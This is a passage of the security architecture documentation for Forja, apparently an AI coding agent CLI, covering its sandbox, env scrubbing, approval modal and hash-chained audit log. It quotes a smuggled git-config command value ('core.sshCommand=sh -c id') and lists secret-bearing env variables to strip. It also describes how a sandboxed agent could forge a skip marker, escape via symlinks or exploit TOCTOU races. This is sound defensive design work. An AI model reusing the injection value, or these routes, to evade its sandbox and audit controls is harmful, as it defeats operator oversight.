| Spec line 928 ("main não tem exec privilege") | Not enforced — `Bun.spawn` is reachable from main | Enforced — main only writes a request; the worker holds the exec primitive |
| Latency overhead per call | ~zero (function call) | ~30–80ms (Bun cold-start per worker) |
| Process state across calls | Shared (the same node — but tools don't store state intentionally) | Isolated (every call is a fresh subprocess; nothing survives) |
| Worker crash blast radius | Crashes the agent | Confined to the one `execute` call → `{ok:false, error:'worker crashed: ...'}` |
| Env scrubbing | Applied at each `Bun.spawn` inside the handler | Applied to the worker's own env at spawn time AND the worker re-scrubs before its inner bash |
| Proto-pollution defense | `safeJsonParse` on the handler's args reviver | `safeJsonParse` on BOTH wire directions (broker→worker request, worker→broker response) |

**When to pick which:**

- **Stay on `in-process`** for the 99% case — local dev, CI, single-tenant deployments. The latency floor matters when you do dozens of short bash calls per turn.
- **Switch to `spawn`** when (a) the threat model values exec-privilege isolation between main and bash (multi-tenant agents, regulated environments where spec §13.7 line 928 is load-bearing), (b) you want crash isolation so a bash handler bug cannot take the whole agent down, or (c) you're profiling bash-heavy workflows and want clean process snapshots per call.

**Both modes** are FIFO-serialized per broker instance: concurrent `execute` calls queue. Spec line 928's "single-writer" property is preserved either way. A future worker-pool slice may add parallelism inside `spawn` mode without changing the public `Broker` contract.

**Failure mode mapping** (both modes return `BrokerResponse`, never throw):

| Failure | `in-process` | `spawn` |
|---|---|---|
| sandbox wrap throws | `error: 'sandbox wrap failed: ...'` | `error: 'sandbox wrap failed: ...'` |
| spawn / fork throws | `error: 'spawn failed: ...'` | `error: 'spawn failed: ...'` |
| timeout | child killed, `error: 'timeout after Nms'` | worker killed, `error: 'timeout after Nms'` |
| worker crash / no response | n/a | `error: 'worker produced no response'`, `exitCode` set |
| malformed worker response | n/a | `error: 'invalid response: ...'`, `exitCode` set; `worker.crashed` telemetry emitted |

### 5.5.9 Env scrubbing

`src/sanitize/env.ts`. Applied at every spawn boundary (bash tool, bg/manager, broker worker, subagent spawn).

Patterns stripped before `Bun.spawn`:

| Pattern | Examples |
|---|---|
| Suffix-based | `*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `*_PASS` |
| Provider prefix | `AWS_*`, `OPENAI_*`, `ANTHROPIC_*` |
| Cloud-specific | `GOOGLE_API_KEY`, `GEMINI_API_KEY`, `CLOUDSDK_*` |
| VCS / pkg | `GITHUB_TOKEN`, `GH_TOKEN`, `NPM_TOKEN`, `DOCKER_PASSWORD`, `DOCKER_AUTH_CONFIG` |
| Slice 128 R4 P1 | `SSH_AUTH_SOCK`, `GPG_AGENT_INFO`, `GNUPGHOME`, `KUBECONFIG`, `OP_SESSION_*` |
| Slice 129 R5 P0-3 (git config bypass) | `GIT_CONFIG_*` (PARAMETERS / COUNT / KEY_n / VALUE_n), `GIT_SSH`, `GIT_SSH_COMMAND`, `GIT_EDITOR`, `GIT_PAGER`, `GIT_PROXY_COMMAND`, `GIT_EXTERNAL_DIFF`, `GIT_TEMPLATE_DIR` |

The bash AST resolver's `-c` argv refuse (slice 128 R4 P0-Launder-2) + `--git-dir`/`--work-tree` refuse (slice 129 R5 P0-2) bind with env scrub to close the git-config-via-env injection vector — an attacker setting `GIT_CONFIG_PARAMETERS="'core.sshCommand=sh -c id'"` would have its env stripped before bash sees it, so the bash subprocess loads no malicious config.

False positives (e.g., a legitimate `BUILD_TOKEN`) are acceptable cost — scripts that genuinely need a redacted variable pass it inline (`SOMEKEY=value command`).

### 5.5.10 `sandbox_skip` marker

`~/.config/forja/sandbox_skip`. Slice 122.

Marker file that, when present, lets Forja boot without the sandbox-availability prompt. Operator opt-in for workflows where sandbox is wrong (CI environments that need unsandboxed FS access, debugging the engine itself). Created only via `agent welcome --skip-sandbox` after a confirmation flow.

Slice 128 R4 P0-Sand-2 added `.config/forja` to `HIDE_PATHS_DIRS` to prevent a sandboxed process from forging the marker (which would silently disable sandbox on next session start). Slice 122 also added a symlink-escape check — the `sandbox_skip` file itself must not be a symlink (would let an attacker plant a symlink pointing into HIDE_PATHS to bypass the marker check on a fresh boot).

### 5.5.11 Operator introspection

Read-only CLI verbs that surface engine state for review. Designed to run without an API key (DB+git only, no provider call) so post-incident forensics doesn't depend on provider availability.

| Verb | Purpose |
|---|---|
| `agent permission verify` | Walk `approvals_log` chain, report integrity + first-mismatch row. |
| `agent permission seal-verify` | Cross-reference seal store against the chain (slice 128 added `install_id` binding to close cross-install forgery). |
| `agent permission replay <seq>` | Render a single audit row + reason chain + score components + classifier metadata + sandbox profile. |
| `agent permission diff <seq1> <seq2>` | Diff two rows field by field. |
| `agent perms` (or `--explain-permissions`) | Render merged policy with per-section layer attribution. |
| `agent forensics <session>` | Generate signed `forensics_<session>_<ts>.tar.gz` bundle with all session audit data (AUDIT.md §5). |
| `/perms` slash command (in REPL) | Render merged policy inline. |
| `/perms why <section>` | Render provenance for a specific section. |

These surfaces are the operator's main path to understand what the engine decided + why. Pre-incident, they support routine review; post-incident, they're the forensic floor.

### 5.5.12 TUI modal as a security surface

The modal renderer itself implements several anti-confusion defenses (slice 125 R2 + slice 128 R4):

- **Default selection = last option ("No").** Operator must actively select Yes; Esc/Ctrl+C deny by default. (Spec UI.md §5.5 D5/D65.)
- **Action bold + cwd context.** The actual command/path/URL is the visual anchor; everything else is secondary.
- **Source attribution.** `matched rule: rm -rf * (project policy)` tells the operator WHERE the rule lives so they can edit it post-decision.
- **Subagent anti-spoof.** Label uses parent-declared subagent name (from frontmatter), never a string the child sent.
- **Queue depth visible.** `(+N waiting)` suffix when more asks are pending — operator isn't surprised by the next modal popping immediately after answering.
- **Input sanitization on rule labels.** Slice 125 R2 P2 strips ANSI escapes + bidi marks from interpolated rule patterns — a malicious `args.command` carrying `\x1b[2J` can't blank the terminal or corrupt the modal.
- **No keyboard shortcuts for dangerous answers.** "Yes, don't ask again" has the `shift+tab` shortcut (deliberate two-key chord); plain Tab moves selection cursor. Single-key fat-finger doesn't promote a rule to session-wide.

The modal is the human-in-the-loop. Every prior layer's job is to ensure it's REACHED for high-uncertainty calls and BYPASSED for clearly-allow / clearly-deny ones — operator fatigue from too many confirmations is itself the failure mode.

---

## 6. Audit trail

### 6.1 `approvals_log` (per-install hash chain)

`src/storage/migrations/034-approvals-log.ts`. Spec §7.1.

Every engine decision (`allow`, `deny`, `confirm`, plus post-modal `confirm-allowed` / `confirm-denied`) lands here. Columns:

```
seq                    INTEGER PRIMARY KEY AUTOINCREMENT
ts                     INTEGER NOT NULL
install_id             TEXT NOT NULL       -- ties chain to this install (slice 128 R4 P0)
session_id             TEXT NOT NULL
parent_approval_id     TEXT                -- for subagent calls
tool_name              TEXT NOT NULL
tool_version           TEXT
resolver_version       TEXT
args_hash              TEXT NOT NULL       -- sha256 of canonical args; raw args live in tool_calls
capabilities_json      TEXT NOT NULL       -- sorted capability list
decision               TEXT NOT NULL       -- allow|deny|confirm|confirm-allowed|confirm-denied
score                  REAL                -- 0..1
score_components_json  TEXT                -- only active components (omitted == didn't fire)
confidence             TEXT                -- high|medium|low
classifier_hash        TEXT
classifier_adjust      REAL
policy_hash            TEXT NOT NULL       -- sha256 of merged policy
sandbox_profile        TEXT                -- chosen profile or null
ttl_expires_at         INTEGER             -- for grant-matched decisions
reason_chain_json      TEXT NOT NULL       -- ordered stages: protected-path → ... → approval-gate
prev_hash              TEXT NOT NULL
this_hash              TEXT NOT NULL UNIQUE
```

**Genesis:** `prev_hash = "GENESIS:" || sha256(install_id || created_at_ms)` for the first row. Binds the chain to this installation — a copied DB from another machine fails `verifyChain` because the install_id is different.

**Hash construction:** `this_hash = sha256Hex(canonical_json(row_minus_this_hash))` where `prev_hash` enters AS A COLUMN of the canonical payload (Forja convention, documented in spec §4.2.1). Equivalent to spec's `SHA256(prev || canonical(row))` but operationally simpler.

**Chain rotation** (`src/storage/repos/chain-rotation.ts`): copies all rows to `approvals_log_archived`, deletes from `approvals_log`, restarts the chain with a new genesis derived from `install_id + rotated_at_ms + rotation_id`. Audit-loud: a `chain-break-accepted` row is written when the operator runs `agent permission rotate-chain` to acknowledge an intentional rotation.

### 6.2 `failure_events` (per-session hash chain)

`src/storage/migrations/041-failure-events.ts`. Spec FAILURE_MODES.md §19.

Slice 130 closed the R5 P0-1 gap — `failure_events` existed in the spec since v2 but was never materialized. Captures classified failures that don't fit the approval-log shape:

- `sandbox.tool_unavailable` — `bwrap` / `sandbox-exec` missing at boot.
- `sandbox.mid_session_loss` — tool available at boot, gone at spawn time.
- `storage.lock_contention` — SQLITE_BUSY during a best-effort persist.
- `storage.persist_failed` — other DB errors during best-effort persist.
- The rest of the catalog (provider, parse, MCP, classifier, index, etc. — see FAILURE_MODES.md §3–§17) is spec-reserved with `code` + `classe` fixed; emit sites wire as their owning subsystem gets a refactor pass.

**Chain scope:** per-session (not per-install like `approvals_log`). Genesis `prev_chain_hash = sha256(session_id)`. Pre-session events use sentinel `session_id = 'bootstrap'`. Corruption in one session's chain doesn't cascade.

**Defense:** code vocabulary registry (`src/failures/codes.ts:CODE_VOCABULARY`) — emit with unregistered code fails loud at the writer; prevents drift between sites. Recovery action validated against `{fatal, ignored, degraded, pending_repair}` + parameterized patterns (`retried_<N>x`, `fallback_to_<X>`). Payload scrubbed for proto-pollution + redacted via the canonical telemetry regex set (paths, URLs, tokens, IP literals).

### 6.3 `outcome_signals` (derived audit, no chain)

`src/storage/migrations/042-outcome-signals.ts`. Spec PERMISSION_ENGINE.md §6.3.2.1.

Slice 131 materializes the calibration triples spec §6.3.2 specifies. Each signal links an observable outcome to an `approvals_log.seq`:

| Signal kind | Weight | Wire site | Strength |
|---|---:|---|---|
| `tool_error` | 0.30 | harness/loop after `tool_finished` with `failed && !denied` | Weak |
| `failure_event` | 0.50 | failures/sink dual-write when `payload.approval_seq` matches session | Medium |
| `checkpoint_reverted` | 0.90 | cli/checkpoints `--undo` for each approval after the restored checkpoint | Strong |
| `session_aborted` | 0.20 | harness/loop `finish()` last 5 approvals when terminal is interrupted/error | Weak |

`computeOutcomeForApproval(seq)` walks signals via max-wins composite. Threshold 0.5 → `harmful`. Calibration scripts consume `(score, score_components_json, decision, outcome)` triples for logistic regression — see spec §6.3.2.1 for the baseline-v2.0 contract. Slice 138 ships the in-tree triple extractor + CLI verb (`agent permission calibration-export`, spec §6.3.2.2); offline regression on the NDJSON output stays operator-tooling.

**Derived-audit semantics** (spec AUDIT.md §4.2.3): no `chain_hash` column. Every signal derives 100% from already-chained events in `approvals_log` + `failure_events` — re-hashing here would duplicate integrity without adding evidence. FK existence is validated at INSERT (sink probe `getApprovalsLogBySeq`), but **not** enforced via `ON DELETE CASCADE` — chain rotation deletes `approvals_log` rows, and cascading the deletion would silently wipe calibration data (slice 131 fixup #1). `install_id` is denormalized into the signal row so calibration scripts can join across `approvals_log` + `approvals_log_archived` post-rotation.

### 6.4 External sealing

`src/permissions/sealing.ts`. Spec §7.3.

The hash chain inside the DB is only as trustworthy as the DB file. External sealing periodically commits a `(seq, hash)` pair to an out-of-DB store:

- **`worm-file`** (Linux only): append-only file with `chattr +a` immutability flag. Tampering requires root to remove the flag.
- **`rfc3161-tsa`**: cryptographic timestamp authority. Each seal carries a TSA signature binding the chain head to wall-clock time.
- **`git-anchored`**: commits to a dedicated git ref. Pushed to a remote, the seal inherits whatever durability the remote provides.
- **`s3-object-lock`**: S3 object with COMPLIANCE-mode object lock. Immutable for the configured retention period; not even the bucket owner can delete.

`verifySealAgainstChain` cross-references seal entries against `approvals_log`. Duplicate seq detection (slice 129 R5 P1) catches replay attacks where a hostile seal store surfaces the same `(seq, hash)` twice to inflate `entriesChecked` and mask a chain gap.

### 6.5 Privacy

Audit deliberately excludes raw tool arguments and outputs from the chain. `approvals_log.args_hash` is the sha256 of the canonical args; the raw args live in `tool_calls.input` (v1 ledger, not chained). Joining requires both rows. This is intentional:

- The chain is the **forensic evidence layer** — what was decided, by which rule, against which capabilities. Tampering surfaces via hash mismatch.
- The raw I/O layer (`tool_calls`, `messages`) carries the high-PII content. Retention is shorter (90d default) and redaction patterns apply (`src/telemetry/scrubbing.ts`).

`failure_events.payload_json` and `outcome_signals.payload_json` both pass through `scrubFailurePayload` before persist: proto-pollution scrub + recursive string scrub via the canonical regex set + 8 KiB cap with truncation marker + `_scrub_failed` marker if JSON.stringify itself throws (BigInt, cyclic refs after proto-scrub, etc.).

---

## 7. Failure modes & graceful degradation

The engine has an explicit state machine (`src/permissions/state-machine.ts`):

```
init → loading-policy → validating-chain → ready
                              ↓
                          refusing       (broken chain w/o accept flag)
                                          (sandbox required but unavailable)
                              ↓
                          degraded       (sandbox lenient + unavailable)
                                          (seal backend failed)
```

In `degraded`:
- Every would-be `allow` is upgraded to `confirm` (spec §6.5).
- A heartbeat banner emits on every tool call (slice 92) so operators see the degraded state continuously, not just at the first transition.
- Audit rows carry the degraded state in `reason_chain` so replays can distinguish "this would have been allow in healthy state" from "this was allow because no degradation logic fired".

In `refusing`:
- Every `engine.check` returns `deny`. The engine is functional enough to record the deny rows; it just doesn't authorize anything.
- Operator must restart with a corrected policy / repaired chain / installed sandbox tool.

`failure_events` captures the transitions:

```
sandbox.tool_unavailable        bootstrap probe failed
sandbox.mid_session_loss        bg/manager spawn probe detected loss
storage.lock_contention         SQLITE_BUSY during best-effort persist
storage.persist_failed          other DB error during best-effort persist
```

The catch sites around `failureSink.emit` ALL log to stderr in addition to attempting the structured write — slice 130 fixup #6 closed the gap where a broken `failure_events` table (e.g., dropped via privilege escalation) would have silenced every future emit silently.

---

## 8. What's NOT in scope (declared honestly)

Spec §1 principle: "declare what was NOT measured." This section lists what Forja's security architecture does NOT cover, so operators with stricter threat models can layer additional defenses.

1. **Kernel-level adversary.** Root on the operator's machine defeats every layer above. Forja's response is audit (the chain detects post-facto rewrites) + the recommendation to seal externally via RFC3161 or S3 object lock.
2. **Multi-tenant code execution.** The sandbox profiles are sized for "agent edits source code on developer's machine", not "isolate untrusted tenant A from tenant B". For multi-tenant use, layer container isolation (Docker, Firecracker, gVisor) BENEATH Forja.
3. **Network egress at the packet layer.** `cwd-rw-net` inherits the parent network namespace. `fetch_url`'s SSRF blocklist + per-host `allow_hosts` / `deny_hosts` in policy are the only egress controls. Operators needing kernel-level filter must run Forja inside a network namespace they control.
4. **Sandbox argv recording.** The chosen profile is in `approvals_log.sandbox_profile`. The exact `bwrap --ro-bind / / --tmpfs /tmp ... -- bash -c <cmd>` argv is reconstructible deterministically from `(profile, cwd, home)` but not recorded per-call. Forensic reconstruction trusts that `maybeWrapSandboxArgv` is bit-stable.
5. **In-sandbox behavior.** Audit covers decisions, failures, outcomes. It does NOT cover which files were read/written, sockets opened, subprocesses spawned, CPU/RAM consumed. strace/eBPF instrumentation is platform-specific and performance-costly; deliberately out of scope.
6. **Cross-install fleet aggregation.** Each install has its own DB + chain. Multi-install audit aggregation requires DB-level joins; no built-in CLI surface today.
7. **Provider-side prompt injection.** Forja defends against LLM-driven malicious actions but cannot prevent the LLM being prompt-injected. Defense is "every decision must surface through the engine + audit" — even if the model is compromised, its actions land in the chain and the operator's policy gates them.
8. **Time-of-check vs time-of-use (TOCTOU).** The engine resolves `/work/foo.txt` at decision time; bash reads `/work/foo.txt` at execution time. Between, an attacker with FS write could symlink-swap. Sandbox FS isolation mitigates (HIDE_PATHS, ro-bind), but Forja's `symlink_escape` deny only fires on resolver-detectable symlinks (e.g., named in the bash command), not on race-swapped targets between approval and execution.
9. **Persistence across operator account compromise.** If the operator's user account is compromised, Forja's policy files, audit DB, and install_id are all under the attacker's control. The sealing backends (RFC3161, S3 object lock) provide some external evidence, but the operator-trust anchor itself was the basis for the entire model.

---

## 9. References

- **Architectural spec:** `docs/spec/AGENTIC_CLI.md` §1 (root premise), §6 (permission engine), §7 (audit), §9 (sandbox), §11 (protected paths).
- **Per-subsystem specs:** `docs/spec/PERMISSION_ENGINE.md`, `docs/spec/AUDIT.md`, `docs/spec/SECURITY_GUIDELINE.md`, `docs/spec/FAILURE_MODES.md`, `docs/spec/ANTI_PATTERNS.md`.
- **State machine:** `docs/spec/STATE_MACHINE.md`.
- **Tree-sitter-bash grammar:** `docs/spec/TREE_SITTER_SHELL.md`.
- **Implementation entry points:**
  - Engine: `src/permissions/engine.ts`
  - Resolvers: `src/permissions/resolvers/`
  - Sandbox: `src/permissions/sandbox-*.ts`
  - Audit chain: `src/permissions/audit.ts`, `src/permissions/sealing*.ts`
  - Failure events: `src/failures/`
  - Outcome signals: `src/outcomes/`
- **Per-slice security history:** `docs/BACKLOG.md` — review pass notes R1–R5 (slices 125, 127, 128, 129) document specific findings and fixes; slices 130 (failure_events), 131 (outcome_signals), 132 (spec PR registration) close the v2 audit floor.

---

## 10. Reporting security issues

See [`SECURITY.md`](../SECURITY.md) at the repo root for the disclosure policy: reporting channel (GitHub Security Advisory), response timeline, in-scope vs out-of-scope categories, and acknowledgment policy. This document covers the architecture under attack; the repo-root file covers how to tell us when the architecture failed.
